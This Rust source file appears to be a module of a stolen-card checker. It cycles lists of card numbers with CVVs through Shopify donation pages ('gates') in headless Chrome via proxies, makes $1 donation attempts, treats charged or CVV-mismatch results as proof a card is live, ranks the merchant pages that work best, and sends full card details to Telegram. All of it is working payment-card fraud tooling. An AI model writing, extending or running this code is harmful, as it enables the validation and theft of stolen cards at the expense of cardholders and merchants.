use anyhow::{Context, Result};
use colored::*;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::path::Path;
use std::time::Duration;
use glob::glob;

use crate::common::{Gate, CardData, CheckResult};
use crate::telegram;

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct ValidGate {
    pub url: String,
    pub success_count: usize,
    pub failure_count: usize,
    pub last_tested: String,
    pub success_rate: f64,
    pub gateway: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct GateStats {
    pub valid_gates: Vec<ValidGate>,
    pub total_tested: usize,
    pub total_valid: usize,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct DiscoveryResult {
    pub card: String,
    pub gate: String,
    pub status: String,
    pub success: bool,
    pub timestamp: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct DiscoveryResults {
    pub results: Vec<DiscoveryResult>,
    pub total_cards: usize,
    pub total_gates: usize,
    pub total_authorizations: usize,
    pub total_declined: usize,
    pub success_rate: f64,
    pub duration_seconds: f64,
}

pub struct GateDiscovery {
    gates_directory: String,
    valid_gates_file: String,
    valid_gates: HashMap<String, ValidGate>,
    prioritize_valid: bool,
    valid_weight: usize,
    invalid_weight: usize,
}

impl GateDiscovery {
    pub fn new(
        gates_directory: String,
        valid_gates_file: String,
        prioritize_valid: bool,
        valid_weight: usize,
        invalid_weight: usize,
    ) -> Result<Self> {
        let mut discovery = Self {
            gates_directory,
            valid_gates_file: valid_gates_file.clone(),
            valid_gates: HashMap::new(),
            prioritize_valid,
            valid_weight,
            invalid_weight,
        };
        
        // Load existing valid gates if file exists
        if Path::new(&valid_gates_file).exists() {
            discovery.load_valid_gates()?;
        }
        
        Ok(discovery)
    }
    
    fn load_valid_gates(&mut self) -> Result<()> {
        let content = fs::read_to_string(&self.valid_gates_file)
            .context("Failed to read valid gates file")?;
        
        let stats: GateStats = serde_json::from_str(&content)
            .context("Failed to parse valid gates JSON")?;
        
        for gate in stats.valid_gates {
            self.valid_gates.insert(gate.url.clone(), gate);
        }
        
        println!("{} Loaded {} valid gates from cache", "✓".green(), self.valid_gates.len());
        Ok(())
    }
    
    pub fn save_valid_gates(&self) -> Result<()> {
        let mut gates: Vec<ValidGate> = self.valid_gates.values().cloned().collect();
        gates.sort_by(|a, b| b.success_rate.partial_cmp(&a.success_rate).unwrap());
        
        let stats = GateStats {
            total_valid: gates.len(),
            total_tested: gates.iter().map(|g| g.success_count + g.failure_count).sum(),
            valid_gates: gates,
        };
        
        let json = serde_json::to_string_pretty(&stats)?;
        fs::write(&self.valid_gates_file, json)?;
        
        println!("{} Saved {} valid gates to {}", 
            "✓".green(), 
            stats.total_valid, 
            self.valid_gates_file
        );
        
        Ok(())
    }
    
    pub fn load_all_gates(&self) -> Result<Vec<String>> {
        let mut all_gates = Vec::new();
        
        // Validate directory exists
        if !Path::new(&self.gates_directory).exists() {
            anyhow::bail!("Gates directory does not exist: {}", self.gates_directory);
        }
        
        if !Path::new(&self.gates_directory).is_dir() {
            anyhow::bail!("Gates path is not a directory: {}", self.gates_directory);
        }
        
        let pattern = format!("{}/*.txt", self.gates_directory);
        println!("{} Loading gates from: {}", "→".cyan(), pattern);
        
        let entries: Vec<_> = glob(&pattern)?.collect();
        
        if entries.is_empty() {
            anyhow::bail!("No .txt files found in directory: {}", self.gates_directory);
        }
        
        for entry in entries {
            match entry {
                Ok(path) => {
                    match fs::read_to_string(&path) {
                        Ok(content) => {
                            for line in content.lines() {
                                let url = line.trim();
                                if !url.is_empty() && url.starts_with("http") {
                                    all_gates.push(url.to_string());
                                }
                            }
                        }
                        Err(e) => {
                            eprintln!("{} Error reading file {:?}: {}", "⚠️".yellow(), path, e);
                        }
                    }
                }
                Err(e) => eprintln!("{} Error accessing file: {}", "⚠️".yellow(), e),
            }
        }
        
        if all_gates.is_empty() {
            anyhow::bail!("No valid gate URLs found in directory");
        }
        
        println!("{} Loaded {} total gates", "✓".green(), all_gates.len());
        Ok(all_gates)
    }
    
    pub fn get_prioritized_gates(&self, all_gates: Vec<String>) -> Vec<String> {
        if !self.prioritize_valid || self.valid_gates.is_empty() {
            return all_gates;
        }
        
        let mut prioritized = Vec::new();
        let mut remaining = Vec::new();
        
        // Separate valid and unknown gates
        for gate_url in all_gates {
            if self.valid_gates.contains_key(&gate_url) {
                // Add valid gates multiple times based on weight
                for _ in 0..self.valid_weight {
                    prioritized.push(gate_url.clone());
                }
            } else {
                remaining.push(gate_url);
            }
        }
        
        // Add remaining gates with lower weight
        for gate_url in remaining {
            for _ in 0..self.invalid_weight {
                prioritized.push(gate_url.clone());
            }
        }
        
        println!("{} Prioritized {} valid gates (weight: {}x)", 
            "✓".green(), 
            self.valid_gates.len(),
            self.valid_weight
        );
        
        prioritized
    }
    
    pub fn record_result(&mut self, gate_url: &str, success: bool) {
        let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        
        let gate = self.valid_gates.entry(gate_url.to_string()).or_insert(ValidGate {
            url: gate_url.to_string(),
            success_count: 0,
            failure_count: 0,
            last_tested: now.clone(),
            success_rate: 0.0,
            gateway: "Shopify".to_string(),
        });
        
        if success {
            gate.success_count += 1;
        } else {
            gate.failure_count += 1;
        }
        
        gate.last_tested = now;
        
        let total = gate.success_count + gate.failure_count;
        gate.success_rate = if total > 0 {
            (gate.success_count as f64 / total as f64) * 100.0
        } else {
            0.0
        };
    }
    
    pub fn get_stats(&self) -> String {
        let mut gates: Vec<&ValidGate> = self.valid_gates.values().collect();
        gates.sort_by(|a, b| b.success_rate.partial_cmp(&a.success_rate).unwrap());
        
        let mut output = String::new();
        output.push_str(&format!("\n{}\n", "═".repeat(60)));
        output.push_str(&format!("{}\n", "📊 GATE DISCOVERY STATS".bold().green()));
        output.push_str(&format!("{}\n\n", "═".repeat(60)));
        
        output.push_str(&format!("Total Valid Gates: {}\n", gates.len().to_string().bold()));
        
        if !gates.is_empty() {
            output.push_str(&format!("\n{}\n", "Top 10 Gates:".bold().yellow()));
            for (i, gate) in gates.iter().take(10).enumerate() {
                output.push_str(&format!(
                    "{}. {} - Success Rate: {:.1}% ({}/{})\n",
                    i + 1,
                    gate.url,
                    gate.success_rate,
                    gate.success_count,
                    gate.success_count + gate.failure_count
                ));
            }
        }
        
        output
    }
}

pub fn convert_to_gate_format(url: String) -> Gate {
    Gate {
        url,
        gateway: "Shopify".to_string(),
        donation_form: true,
        title: None,
        has_shopify: true,
        has_shopify_payments: false,
        payment_gateway: Some("Shopify".to_string()),
        donation_keywords_count: 0,
    }
}

// ============================================================================
// DISCOVERY MODE IMPLEMENTATION
// ============================================================================

use crate::live_stats::LiveStats;
use crate::bin_lookup;
use thirtyfour::prelude::*;

/// Load cards from file
fn load_cards_from_file(path: &str) -> Result<Vec<CardData>> {
    // Validate file exists
    if !Path::new(path).exists() {
        anyhow::bail!("Cards file does not exist: {}", path);
    }
    
    if !Path::new(path).is_file() {
        anyhow::bail!("Cards path is not a file: {}", path);
    }
    
    let content = fs::read_to_string(path)
        .context(format!("Failed to read cards file: {}", path))?;
    
    if content.trim().is_empty() {
        anyhow::bail!("Cards file is empty: {}", path);
    }
    
    let mut cards = Vec::new();
    let mut line_num = 0;
    let mut valid_count = 0;
    let mut error_count = 0;
    
    for line in content.lines() {
        line_num += 1;
        let line = line.trim();
        
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        
        match CardData::from_string(line) {
            Ok(card) => {
                cards.push(card);
                valid_count += 1;
            }
            Err(e) => {
                error_count += 1;
                if error_count <= 3 {  // Only show first 3 errors
                    eprintln!("{} Line {}: Invalid card format - {}", "⚠️".yellow(), line_num, e);
                }
            }
        }
    }
    
    if error_count > 3 {
        eprintln!("{} ... and {} more errors", "⚠️".yellow(), error_count - 3);
    }
    
    println!("{} Loaded {} valid cards from {} lines", 
        "✓".green(), valid_count, line_num);
    
    if cards.is_empty() {
        anyhow::bail!("No valid cards found in file. Expected format: number|month|year|cvv");
    }
    
    Ok(cards)
}

/// Test a card on a gate (simplified version for discovery)
async fn test_card_on_gate(
    driver: &WebDriver,
    card: &CardData,
    gate_url: &str,
    auth_only: bool,
) -> Result<(bool, String)> {
    // Use the try_donation function from checker_v3
    // For discovery mode, we just test with $1
    let test_card = if auth_only {
        CardData {
            number: card.number.clone(),
            month: card.month.clone(),
            year: card.year.clone(),
            cvv: "999".to_string(),  // Wrong CVV for auth-only
        }
    } else {
        card.clone()
    };
    
    match crate::checker_v3::try_donation(driver, &test_card, gate_url, 1.0).await {
        Ok(status) => {
            let is_success = if auth_only {
                status == "CVV_MISMATCH"
            } else {
                status == "CHARGED" || status == "CVV_MISMATCH" || status == "INSUFFICIENT_FUNDS"
            };
            
            Ok((is_success, status))
        }
        Err(e) => {
            Ok((false, format!("ERROR: {}", e)))
        }
    }
}

/// Main discovery function - cycles through all gates from directory
pub async fn run_discovery(
    gates_dir: &str,
    output_file: &str,
    max_gates: Option<usize>,
    cards_file: &str,
    telegram_config: Option<&str>,
    auth_only: bool,
    proxy_file: Option<&str>,
) -> Result<()> {
    println!("\n{}", "═".repeat(60).bold());
    println!("{}", "🔍 DISCOVERY MODE - Gate Discovery System".bold().cyan());
    println!("{}", "═".repeat(60).bold());
    
    if auth_only {
        println!("{}", "🔐 AUTHORIZATION-ONLY MODE".green());
        println!("{}", "   Using wrong CVV - NO CHARGES will be made".yellow());
    } else {
        println!("{}", "💳 CHARGE MODE".yellow());
        println!("{}", "   Using real CVV - cards may be charged!".red());
    }
    
    // 1. Initialize discovery
    println!("\n{} Initializing gate discovery system...", "→".cyan());
    let mut discovery = GateDiscovery::new(
        gates_dir.to_string(),
        "valid_gates.json".to_string(),
        true,  // prioritize_valid
        5,     // valid_weight
        1,     // invalid_weight
    )?;
    
    // 2. Load gates from directory
    println!("{} Loading gates from directory...", "→".cyan());
    let all_gates = discovery.load_all_gates()?;
    let mut prioritized_gates = discovery.get_prioritized_gates(all_gates);
    
    // Apply max_gates limit
    if let Some(max) = max_gates {
        prioritized_gates.truncate(max);
        println!("{} Limited to {} gates", "→".cyan(), max);
    }
    
    if prioritized_gates.is_empty() {
        anyhow::bail!("No gates found in directory");
    }
    
    // 3. Load cards
    println!("{} Loading cards...", "→".cyan());
    let cards = load_cards_from_file(cards_file)?;
    
    // 4. Load proxies (if provided)
    let _proxy_pool = if let Some(proxy_path) = proxy_file {
        println!("{} Loading proxies from: {}", "→".cyan(), proxy_path);
        match crate::proxy::ProxyPool::from_file(proxy_path) {
            Ok(pool) => {
                println!("{} Loaded {} proxies", "✓".green(), pool.len());
                Some(pool)
            }
            Err(e) => {
                println!("{} Failed to load proxies: {}", "⚠️".yellow(), e);
                println!("{}", "   Continuing without proxies...".yellow());
                None
            }
        }
    } else {
        None
    };
    
    // 5. Initialize Telegram (if provided)
    let telegram_cfg = if let Some(config_path) = telegram_config {
        println!("{} Telegram notifications enabled", "✓".green());
        telegram::load_config(config_path).ok()
    } else {
        None
    };
    
    // 6. Setup WebDriver
    println!("{} Connecting to ChromeDriver...", "→".cyan());
    let mut caps = DesiredCapabilities::chrome();
    caps.add_arg("--headless")?;
    caps.add_arg("--no-sandbox")?;
    caps.add_arg("--disable-dev-shm-usage")?;
    caps.add_arg("--disable-gpu")?;
    caps.add_arg("--window-size=1920,1080")?;
    caps.add_arg("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")?;
    
    let driver = WebDriver::new("http://localhost:9515", caps).await
        .context("Failed to connect to ChromeDriver. Is it running on port 9515?")?;
    
    driver.set_page_load_timeout(Duration::from_secs(30)).await?;
    
    println!("{} WebDriver connected", "✓".green());
    println!("\n{}", "═".repeat(60).bold());
    println!("{}", "Starting discovery...".bold().green());
    println!("{}", "═".repeat(60).bold());
    
    // 7. Create live stats
    let mut stats = LiveStats::new(cards.len(), 4);  // 4 cards per batch
    
    // 8. Main testing loop - ROTATIONAL STRATEGY
    // Each card tests ONE gate, rotating through the gate list
    let mut total_authorizations = 0;
    let mut total_declined = 0;
    let mut gate_index = 0;
    let mut all_results = Vec::new();
    let start_time = std::time::Instant::now();
    
    println!("{}", "Strategy: Each card tests ONE gate, rotating through all gates".yellow());
    println!("{}", format!("   {} cards × {} gates = {} total tests", cards.len(), prioritized_gates.len(), cards.len()).cyan());
    
    for (card_idx, card) in cards.iter().enumerate() {
        let card_str = format!("{}|{}|{}|{}", card.number, card.month, card.year, card.cvv);
        let card_masked = card.masked();
        stats.update_card(&card_str, card_idx);
        stats.display();
        
        // Get the next gate in rotation
        let gate_url = &prioritized_gates[gate_index % prioritized_gates.len()];
        let timestamp = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        
        // Test this card on this ONE gate
        match test_card_on_gate(&driver, card, gate_url, auth_only).await {
            Ok((success, status)) => {
                // Record result for output file
                all_results.push(DiscoveryResult {
                    card: card_masked.clone(),
                    gate: gate_url.clone(),
                    status: status.clone(),
                    success,
                    timestamp: timestamp.clone(),
                });
                
                if success {
                    // Record success
                    discovery.record_result(gate_url, true);
                    total_authorizations += 1;
                    
                    // Send Telegram notification
                    if let Some(ref cfg) = telegram_cfg {
                        let bin = if card.number.len() >= 6 { &card.number[..6] } else { "UNKNOWN" };
                        if let Ok(bin_info) = bin_lookup::lookup_bin(bin) {
                            let _ = telegram::notify_success(
                                cfg,
                                &card_str,
                                gate_url,
                                0.0,  // No charge in discovery mode
                                &status,
                                &bin_info,
                            );
                        }
                    }
                    
                    stats.record_result(&status);
                    stats.display();
                    
                    // Save progress after each success
                    let _ = discovery.save_valid_gates();
                    
                    println!("{} Card {} authorized on gate {} ({})", 
                        "✓".green(), 
                        card_idx + 1, 
                        gate_index + 1,
                        status.green()
                    );
                } else {
                    discovery.record_result(gate_url, false);
                    total_declined += 1;
                    println!("{} Card {} declined on gate {} ({})", 
                        "✗".red(), 
                        card_idx + 1, 
                        gate_index + 1,
                        status.dimmed()
                    );
                }
            }
            Err(e) => {
                eprintln!("\n{} Error testing gate {}: {}", "⚠️".yellow(), gate_url, e);
                discovery.record_result(gate_url, false);
                total_declined += 1;
                
                // Record error result
                all_results.push(DiscoveryResult {
                    card: card_masked.clone(),
                    gate: gate_url.clone(),
                    status: format!("ERROR: {}", e),
                    success: false,
                    timestamp,
                });
            }
        }
        
        // Move to next gate for next card
        gate_index += 1;
        
        // Small delay between cards
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    
    let duration = start_time.elapsed().as_secs_f64();
    
    // 9. Cleanup
    driver.quit().await?;
    
    // 10. Display summary
    println!("\n{}", stats.get_summary());
    println!("{}", discovery.get_stats());
    
    println!("\n{}", "═".repeat(60).bold());
    println!("{}", format!("✅ Discovery Complete - {} Authorizations Found", total_authorizations).bold().green());
    println!("{}", "═".repeat(60).bold());
    
    // 11. Save final results
    discovery.save_valid_gates()?;
    
    // 12. Save discovery results to output file
    let success_rate = if cards.len() > 0 {
        (total_authorizations as f64 / cards.len() as f64) * 100.0
    } else {
        0.0
    };
    
    let discovery_results = DiscoveryResults {
        results: all_results,
        total_cards: cards.len(),
        total_gates: prioritized_gates.len(),
        total_authorizations,
        total_declined,
        success_rate,
        duration_seconds: duration,
    };
    
    let results_json = serde_json::to_string_pretty(&discovery_results)?;
    fs::write(output_file, results_json)?;
    
    println!("\n{}", "═".repeat(60).bold());
    println!("{}", "✅ Discovery Complete!".bold().green());
    println!("{}", "═".repeat(60).bold());
    
    println!("\n{} Results saved to:", "✓".green());
    println!("   • {} - Detailed discovery results", output_file.bold());
    println!("   • {} - Valid gates database", "valid_gates.json".bold());
    
    Ok(())
}
